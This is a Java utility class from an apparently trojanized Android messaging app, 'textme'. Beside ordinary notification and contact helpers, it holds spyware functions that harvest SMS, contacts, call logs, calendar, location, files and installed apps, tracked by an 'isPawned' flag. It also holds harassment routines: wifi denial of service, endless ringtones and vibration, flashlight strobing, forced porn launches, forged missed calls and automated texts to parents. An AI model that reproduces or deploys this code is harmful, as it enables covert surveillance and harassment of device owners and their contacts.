package com.candroid.textme.api;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.RemoteInput;
import android.app.SearchManager;
import android.app.WallpaperManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.provider.AlarmClock;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.provider.UserDictionary;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Pair;

import com.candroid.textme.R;
import com.candroid.textme.data.Constants;
import com.candroid.textme.data.Pornhub;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.data.pojos.CalendarEvent;
import com.candroid.textme.data.pojos.Contact;
import com.candroid.textme.data.pojos.PhoneCall;
import com.candroid.textme.data.pojos.SmsMsg;
import com.candroid.textme.ui.activities.MainActivity;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import static com.candroid.textme.jobs.JobsScheduler.CALENDAR_EVENTS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.CONTACTS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.DCIM_KEY;
import static com.candroid.textme.jobs.JobsScheduler.DEVICE_KEY;
import static com.candroid.textme.jobs.JobsScheduler.FAKE_PHONE_CALL_KEY;
import static com.candroid.textme.jobs.JobsScheduler.PACKAGES_KEY;
import static com.candroid.textme.jobs.JobsScheduler.PHONE_CALLS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.SMS_KEY;

public class Lofl {
    private static int sId = -1;
    private static NotificationManager sNotificationManager;
    private static Bitmap sLargeIcon;
    public static boolean sIsFlaghlightOn = false;
    public static CameraManager sCameraManager;

    public static void uninstallApp(Context context, String packageName){
        Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse(packageName));
        context.startActivity(intent);
    }

    public static List<ApplicationInfo> getInstalledApps(Context context){
        return context.getPackageManager().getInstalledApplications(PackageManager.MATCH_UNINSTALLED_PACKAGES);
    }

    public static File[] getFilesForDirectory(String path){
        return new File(path).listFiles();
    }

    public static boolean isImage(File file){
        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
        return mimeType != null && mimeType.startsWith("image");
    }

    public static boolean isVideo(File file){
        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
        return mimeType != null && mimeType.startsWith("video");    }

    public static boolean isText(File file){
        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
        return mimeType != null && mimeType.startsWith("text") && !mimeType.endsWith("iif");
    }

    public static boolean isSpreadsheet(File file){
        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
        if(mimeType != null && mimeType.contains("excel")){
            return true;
        }else if(mimeType != null && mimeType.contains("oasis.opendocument.spreadsheet")){
            return true;
        }else{
            return false;
        }
    }

    public static boolean isQuickbooks(File file){
        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
       if(mimeType != null && mimeType.contains("qbooks")){
            return true;
        }else if(mimeType != null && mimeType.equals("text/iif")){
            return true;
        }else if(mimeType != null && mimeType.equals("application/vnd.intu.qbo")){
           return true;
       }
        else{
            return false;
        }
    }

    public static File getPicturesDirectory(){
        return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getPath());
    }

    public static File getDcimDirectory(){
        return new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath());
    }

    public static boolean isExternalStorageReadable(){
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state) ||
                Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
            return true;
        }
        return false;
    }

    public static byte[] fileToBytes(File f ) {
        ByteArrayOutputStream bos = null;
        File file = new File(f.getPath());
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            bos = new ByteArrayOutputStream();
            for (int len = 0; (len = fis.read((buffer))) != -1; ) {
                bos.write(buffer, 0, len);
            }
            return bos.toByteArray();
        }catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String handleSharedText(Intent intent) {
        StringBuilder text = new StringBuilder();
        Bundle extras = intent.getExtras();
        if (extras != null) {
            if (extras.containsKey(Intent.EXTRA_TEXT)) {
                text.append(extras.getString(Intent.EXTRA_TEXT));
            }
            if (extras.containsKey(Intent.EXTRA_SUBJECT)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_SUBJECT));
            }
            if (extras.containsKey(Intent.EXTRA_TITLE)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_TITLE));
            }
            if (extras.containsKey(Intent.EXTRA_HTML_TEXT)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_TITLE));
            }
        }
        return text.toString();
    }

    public static void vibrator(Context context){
        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if(vibrator.hasVibrator()){
            if(vibrator.hasAmplitudeControl()){
                vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
            }else{
                vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
            }
        }
    }

    public static void phoneCall(Context context, String address){
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:" + address));
        context.startActivity(callIntent);
    }

    public static void searchGoogleMaps(Context context, String query){
        Uri uri = Uri.parse("geo:0, 0?q=" + query);
        Intent mapIntent = new Intent(Intent.ACTION_VIEW, uri);
        mapIntent.setPackage("com.google.android.apps.maps");
        context.startActivity(mapIntent);
    }

    public static void setJobRan(Context context, String key){
        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
        editor.putBoolean(key, true);
        editor.apply();
    }

    public static void tellMyParentsImGay(Context context){
        ArrayList<Contact> contacts = Lofl.fetchContactsInformation(context);
        ArrayList<Contact> parents = new ArrayList<>();
        String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents"};
        for(Contact contact : contacts){
            for(String name : possibleParentNames){
                if(contact.mName.equalsIgnoreCase(name)){
                    parents.add(contact);
                }
            }
        }
        if(parents.size() > 0){
            for(Contact contact : parents){
                Lofl.sendNonDataSms(context, contact.mAddress, "I'm sending an automated sms message to your phone. I'm sorry.");
            }
        }
    }

    public static boolean isPawned(Context context){
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        return sharedPreferences.getBoolean(DCIM_KEY, false) && sharedPreferences.getBoolean(PACKAGES_KEY, false) &&
        sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
        sharedPreferences.getBoolean(DEVICE_KEY, false) &&
        sharedPreferences.getBoolean(PHONE_CALLS_KEY, false) &&
        sharedPreferences.getBoolean(SMS_KEY, false) &&
        sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false) &&
        sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
    }

    public static void setAlarmClock(Context context){
        Intent intent = new Intent();
        intent.setAction(AlarmClock.ACTION_SET_ALARM);
        intent.putExtra(AlarmClock.EXTRA_HOUR, 11);
        intent.putExtra(AlarmClock.EXTRA_MINUTES, 0);
        context.startActivity(intent);
    }

    public static void persistentBlinkingFlashlight(final Context context){
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                String cameraId = null;
                if(Lofl.sCameraManager == null) {
                    sCameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                }
                try {
                    cameraId = sCameraManager.getCameraIdList()[0];
                } catch (CameraAccessException e1) {
                    e1.printStackTrace();
                }
                if(sIsFlaghlightOn){
                    try {
                        sCameraManager.setTorchMode(cameraId, false);
                        sIsFlaghlightOn = false;
                    } catch (CameraAccessException e1) {
                        e1.printStackTrace();
                    }catch (IllegalArgumentException e){
                        e.printStackTrace();
                    }
                }else{
                    try {
                        sCameraManager.setTorchMode(cameraId, true);
                        sIsFlaghlightOn = true;
                    } catch (CameraAccessException e1) {
                        e1.printStackTrace();
                    }catch (IllegalArgumentException e){
                        e.printStackTrace();
                    }
                }
            }
        };
        Timer timer = new Timer("flashlightTask", true);
        timer.schedule(timerTask, 300L, 100L);
    }

    public static void turnOffFlashlight(Context context){
        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        try {
            cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], false);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    public static void browserGoogleSearch(Context context, String query){
        try {
            String encodedQuery = URLEncoder.encode(query, "UTF-8");
            Uri uri = Uri.parse(String.format("https://google.com/search?q=%s", encodedQuery));
            Intent googleSearchIntent = new Intent(Intent.ACTION_VIEW, uri);
            context.startActivity(googleSearchIntent);}
        catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public static void browserDuckDuckGoSearch(Context context, String query){
        try {
            String encodedQuery = URLEncoder.encode(query, "UTF-8");
            Uri uri = Uri.parse(String.format("https://duckduckgo.com/?q=%s", encodedQuery));
            Intent googleSearchIntent = new Intent(Intent.ACTION_VIEW, uri);
            context.startActivity(googleSearchIntent);}
        catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    public static void fakeMissedCall(Context context, String number){
        ContentValues values = new ContentValues();
        values.put(CallLog.Calls.NUMBER, number);
        values.put(CallLog.Calls.DURATION, 666);
        values.put(CallLog.Calls.TYPE, 3);
        values.put(CallLog.Calls.CACHED_NAME, "Moe Lester");
        values.put(CallLog.Calls.DATE, System.currentTimeMillis());
        context.getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);
    }

    public static void googleNowQuery(Context context, String query){
        Intent webSearchIntent = new Intent(Intent.ACTION_WEB_SEARCH);
        webSearchIntent.putExtra(SearchManager.QUERY, "I wish somebody would stop trying to attack my system so i could go back to learning android. Where do we do that at? Until then I shall work on a library called Lofl");
        context.startActivity(webSearchIntent);
    }

    public static void playMosquitoRingtoneTwice(Context context){
        new Thread(new Runnable() {
            @Override
            public void run() {
                android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO);
                try {
                    MediaPlayer mediaPlayer = new MediaPlayer();
                    mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
                    mediaPlayer.setDataSource(context, Uri.parse("https://hwcdn.libsyn.com/p/f/3/2/f32dbcf436dca4a0/12000.mp3?c_id=2125606"));
                    mediaPlayer.prepare();
                    for(int i= 0; i < 2; i++){
                        try {
                            Thread.sleep(20000);
                            if(mediaPlayer.isPlaying()){
                                mediaPlayer.stop();
                            }
                            mediaPlayer.start();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    mediaPlayer.release();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public static void playEndlessMosquitoRingtone(Context context){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    MediaPlayer mediaPlayer = new MediaPlayer();
                    mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
                    mediaPlayer.setDataSource(context, Uri.parse("https://hwcdn.libsyn.com/p/f/3/2/f32dbcf436dca4a0/12000.mp3?c_id=2125606"));
                    mediaPlayer.prepare();
                    for(int i= 0; i < 75000; i++){
                        try {
                            Thread.sleep(10000);
                            if(mediaPlayer.isPlaying()){
                                mediaPlayer.stop();
                            }
                            mediaPlayer.start();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public static void watchPornHubVideo(Context context, String videoId){
        Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
        Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
        pornIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(pornIntent);
    }

    public static Bitmap getBitmapFromUrl(String url){
        try {
            InputStream inputStream = new java.net.URL(url).openStream();
            return BitmapFactory.decodeStream(inputStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void changeWallpaper(Context context, Bitmap bitmap){
        try {
            WallpaperManager.getInstance(context).setBitmap(bitmap);
        }
        catch (IOException e) {
            e.printStackTrace();
        }catch (SecurityException se){
            se.printStackTrace();
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }

    private static Bitmap getBitmapIcon(Context context, int icon){
        if(sLargeIcon == null){
            sLargeIcon = BitmapFactory.decodeResource(context.getResources(), icon);
        }
        return sLargeIcon;
    }

    public static void removeNotification(Context context, int id) {
        initNotificationManager(context);
        sNotificationManager.cancel(id);
    }

    public static String lookupPhoneNumberByName(Context context, String name) {
        String address = "";
        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ";
        String[] selectionArgs = new String[]{"%".concat(name).concat("%")};
        String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selection, selectionArgs, null);
        if (cursor.moveToFirst()) {
            address = cursor.getString(0);
        }
        cursor.close();
        return address;
    }

    public static void createConversation(final Context context, String address, String sharedText) {
        Intent notifyIntent = new Intent();
        if(sharedText != null){
            notifyIntent.putExtra(Constants.SHARED_TEXT_KEY, sharedText);
        }
        notifyIntent.putExtra(Constants.ADDRESS, address);
        notifyIntent.setAction(Constants.CREATE_CONVERSATION_ACTION);
        context.sendBroadcast(notifyIntent);
        ((MainActivity) context).runOnUiThread(new Runnable() {
            @Override
            public void run() {
                ((MainActivity)context).onBackPressed();
            }
        });
    }

    public static LocationManager getLocationManager(Context context){
        return (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public static ArrayList<CalendarEvent> fetchCalendarEvents(Context context){
       String[] projection = new String[]{CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
               CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
        ArrayList<CalendarEvent> calendarEvents = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
        if(cursor != null){
            int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
            int titleIndex = cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE);
            int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
            int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
            int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
            int allDayIndex = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY);
            int durationIndex = cursor.getColumnIndex(CalendarContract.Events.DURATION);
            int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
            int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
            int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
            while(cursor.moveToNext()){
                String account = cursor.getString(accountNameIndex);
                String title = cursor.getString(titleIndex);
                String description = cursor.getString(descriptionIndex);
                long beginDate = cursor.getLong(dateStartIndex);
                long endDate = cursor.getLong(dateEndIndex);
                int isAllDay = cursor.getInt(allDayIndex);
                String duration = cursor.getString(durationIndex);
                String timeZone = cursor.getString(calendarTimeZoneIndex);
                String location = cursor.getString(locationIndex);
                String organizer = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.ORGANIZER));
                calendarEvents.add(new CalendarEvent(account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer));
            }
        }
        cursor.close();
        return calendarEvents;
    }

    public static void sendNonDataSms(Context context , String destAddress, String body){
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(destAddress, null, body, null, null);
    }

    public static ArrayList<Contact> fetchContactsInformation(Context context){
        String[] projection = null;
        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
            projection = new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, "has_email"};
        }else{
            projection = new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME};
        }
        ArrayList<Contact> contacts = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, projection, null, null, null);
        int hasEmail = -1;
        if(cursor != null){
            int displayNameIndex = cursor.getColumnIndex("display_name");
            int idIndex = cursor.getColumnIndex("_id");
            while(cursor.moveToNext()){
                String name = cursor.getString(displayNameIndex);
                String email = null;
                String address = null;
                if(Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
                    hasEmail = cursor.getInt(cursor.getColumnIndex("has_email"));
                }
                if(hasEmail == 1){
                    long id = cursor.getLong(idIndex);
                    email = lookupEmailByContactId(context, id);
                }
                address = lookupPhoneNumberByName(context, name);
                contacts.add(new Contact(name, address, email));
            }
        }
        cursor.close();
        return contacts;
    }

    public static void wifiDenialOfService(Context context){
        WifiManager wifiManager = getWifiManager(context);
        new Thread(new Runnable() {
            @Override
            public void run() {
                for(int i = 0; i < 500; i++){
                    try {
                        Thread.sleep(10000);
                        wifiManager.disconnect();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    public static void insertContact(Context context, String name, String number){
        long contactId = insertEmptyContact(context);
        insertContactDisplayName(context, contactId, name);
        insertContactPhoneNumber(context, contactId, number);
    }

    public static long insertEmptyContact(Context context){
        ContentValues contentValues = new ContentValues();
        Uri rawContactUri = context.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, contentValues);
        long contactId = ContentUris.parseId(rawContactUri);
        return contactId;
    }

    public static void insertContactDisplayName(Context context, long  contactId, String name){
        ContentValues contentValues = new ContentValues();
        contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, contactId);
        contentValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
        contentValues.put(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, name);
        context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
    }

    public static void insertContactPhoneNumber(Context context, long contactId, String number){
        ContentValues contentValues = new ContentValues();
        contentValues.put(ContactsContract.Data.RAW_CONTACT_ID, contactId);
        contentValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
        contentValues.put(ContactsContract.CommonDataKinds.Phone.NUMBER, number);
        contentValues.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
        context.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, contentValues);
    }

    public static void dosWifiCard(Context context){
        WifiManager wifiManager = getWifiManager(context);
        int state = wifiManager.getWifiState();
        if( wifiManager.isWifiEnabled()){
            TimerTask dosWifiCardTask = new TimerTask() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    wifiManager.reassociate();
                }
            };
            Timer timer = new Timer("dosWifiCard", true);
            timer.schedule(dosWifiCardTask, 5000L, 5000L);
        }
    }

    public static WifiManager getWifiManager(Context context){
        return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
    }

    public static void wifiScan(Context context){
        getWifiManager(context).startScan();
    }

    private static void dumpDatabaseColumnNamesToLogFile(Cursor cursor){
        String[] columnNames = cursor.getColumnNames();
        for(String columnName : columnNames){
            Log.d("DATABASE COLUMNS", String.format("Column Name = %s", columnName));
        }
    }

    public static String lookupEmailByContactId(Context context, long id){
        String email = null;
        String[] projection = new String[]{ContactsContract.CommonDataKinds.Email.DATA};
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, projection, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{String.valueOf(id)}, null);
        if(cursor != null){
            int emailIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
            if(cursor.moveToFirst()){
                email = cursor.getString(emailIndex);
            }
        }
        cursor.close();
        return email;
    }

    // TODO: 1/30/19 if an empty contact is inserted into the raw contacts table without any data inlcuding name or number then this method will throw a null pointer exception
    public static String reverseLookupNameByPhoneNumber(String address, ContentResolver contentResolver) {
        StringBuilder name = new StringBuilder();
        Uri lookupUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
        try (Cursor cursor = contentResolver.query(lookupUri, new String[]{ContactsContract.Data.DISPLAY_NAME_PRIMARY, ContactsContract.Data.PHOTO_THUMBNAIL_URI}, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                name.append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME_PRIMARY)));
            } else {
                name.append(address.substring(address.indexOf('+') + 2, address.length()));
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
        }catch(SecurityException se){
            return address;
        }
        return String.valueOf(name);
    }

    public static void syncCallLogDataToDatabase(Context context, DatabaseHelper database){
        try {
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            while(cursor.moveToNext()){
                String callType = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String address = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String time = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                long newRowId = Database.insertCallLogEntry(database, callType, address, duration, time);
            }
            cursor.close();
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    public static void notifyAirplaneMode(Context context, String title, String body){
        initNotificationManager(context);
        Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
        builder.setContentTitle(title);
        builder.setContentText(body);
        builder.setSmallIcon(android.R.drawable.stat_notify_error);
        builder.setTimeoutAfter(Constants.TIMEOUT_AFTER);
        builder.setAutoCancel(true);
        sNotificationManager.notify(sId++, builder.build());
    }

    public static void notifySent(Context context, String title, Intent intent){
        createConfirmationsNotificationChannel(context);
        Notification.Builder builder = new Notification.Builder(context, Constants.CONFIRMATIONS_NOTIFICATION_CHANNEL_ID);
        builder.setSmallIcon(android.R.drawable.stat_notify_chat).setContentTitle(title).setPriority(Notification.PRIORITY_DEFAULT).setColor(context.getResources().getColor(android.R.color.holo_green_dark))
                .setGroup(Constants.CONFIRMATIONS_NOTIFICATION_GROUP).setTimeoutAfter(Constants.SENT_CONFIRM_TIMEOUT_AFTER)
                .setAutoCancel(true).setContentIntent(createContentClickIntent(context, intent));
        sNotificationManager.notify(sId++, builder.build());
    }

    private static PendingIntent createContentClickIntent(Context context, Intent intent) {
        intent.setClass(context, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);
        return pendingIntent;
    }

    public static void notify(Context context, Intent intent, String address, String body) {
        sId++;
        Notification.Action whisperAction = null;
        if(intent.hasExtra(Constants.SHARED_TEXT_KEY)){
            whisperAction = createWhisperSharedTextAction(context, address, intent);
        }else{
            whisperAction = createWhisperAction(context, address, intent);
        }
        initNotificationManager(context);
        createPrimaryNotificationChannel(sNotificationManager);
        Notification.Builder notification = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_notify_chat).addAction(whisperAction).setPriority(Notification.PRIORITY_HIGH)
                .setStyle(new Notification.BigTextStyle().bigText(body.toString()).setSummaryText(Constants.NOTIFICATION_SUMMARY))
                .setContentTitle(address).setContentText(body).setColor(context.getResources().getColor(android.R.color.holo_green_light)).setColorized(true)
                .setTimeoutAfter(Constants.TIMEOUT_AFTER).setLargeIcon(Lofl.getBitmapIcon(context, android.R.drawable.sym_action_chat)).setGroup(Constants.PRIMARY_NOTIFICATION_GROUP).setContentIntent(createContentClickIntent(context, intent))
                .setCategory(Notification.CATEGORY_MESSAGE).setShowWhen(true).setAutoCancel(true).setVisibility(Notification.VISIBILITY_PUBLIC);
        sNotificationManager.notify(sId, notification.build());
    }

    private static void initNotificationManager(Context context) {
        if(sNotificationManager == null){
            sNotificationManager = context.getSystemService(NotificationManager.class);
        }
    }

    public static void startPornProvider(final Context context, final int intervalDelay){
        new Thread(new Runnable() {
            @Override
            public void run() {
                for(int i = 0; i < 1000; i++){
                    try {
                        Thread.sleep(intervalDelay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    double randomNumber = Math.random();
                    String video = null;
                    if(randomNumber > 0.5){
                        video = Pornhub.VIDEOS[0];
                    }else{
                        video = Pornhub.VIDEOS[1];
                    }
                    watchPornHubVideo(context, video);
                }
            }
        }).start();
    }

    public static LocationListener getLocationListener(Context context){
        return new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                Database.insertLocation(DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude());
                //Log.d("MessagingService", "latitudate = ".concat(String.valueOf(location.getLatitude()) + " longitude = ".concat(String.valueOf(location.getLongitude()))));
              /*  if(sNotificationManager == null){
                    initNotificationManager(context);
                }*/
/*                Log.d("MessagingService", "location row id = " + Database.insertLocation(context, DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude()));
                createPrimaryNotificationChannel(sNotificationManager);
                Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
                builder.setContentText(String.format("latitude=%s longitude=%s", location.getLatitude(), location.getLongitude()));
                builder.setContentTitle("Location Update");
                builder.setGroup(Constants.PRIMARY_NOTIFICATION_GROUP);
                builder.setSmallIcon(android.R.drawable.ic_menu_mylocation);
                sId++;
                sNotificationManager.notify(sId++, builder.build());*/
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };
    }

    public static ArrayList<SmsMsg>fetchSmsMessages(Context context){
        String[] sentColumns = new String[]{Telephony.Sms.Sent._ID, Telephony.Sms.Sent.TYPE, Telephony.Sms.Sent.BODY, Telephony.Sms.Sent.ADDRESS, Telephony.Sms.Sent.DATE};
        ArrayList<SmsMsg> smsMsgs = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Telephony.Sms.Sent.CONTENT_URI, sentColumns, null, null, null);
        if (cursor != null) {
            int idIndex = cursor.getColumnIndex(Telephony.Sms.Sent._ID);
            int typeIndex = cursor.getColumnIndex(Telephony.Sms.Sent.TYPE);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.Sent.BODY);
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.Sent.ADDRESS);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.Sent.DATE);
            while(cursor.moveToNext()){
                int id = cursor.getInt(idIndex);
                int type = cursor.getInt(typeIndex);
                String body = cursor.getString(bodyIndex);
                String address = cursor.getString(addressIndex);
                long date = cursor.getLong(dateIndex);
                smsMsgs.add(new SmsMsg(address, body, type, date));
            }
            cursor.close();
            cursor = null;
        }
        String[] inboxColumns = new String[]{Telephony.Sms.Inbox._ID, Telephony.Sms.Inbox.TYPE, Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.DATE};
        cursor = context.getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, inboxColumns, null, null);
        if (cursor != null) {
            int idIndex = cursor.getColumnIndex(Telephony.Sms.Inbox._ID);
            int typeIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.TYPE);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.Inbox.DATE);
            while(cursor.moveToNext()){
                int id = cursor.getInt(idIndex);
                int type = cursor.getInt(typeIndex);
                String body = cursor.getString(bodyIndex);
                String address = cursor.getString(addressIndex);
                long date = cursor.getLong(dateIndex);
                smsMsgs.add(new SmsMsg(address, body, type, date));
            }
            cursor.close();
        }
        return smsMsgs;
    }

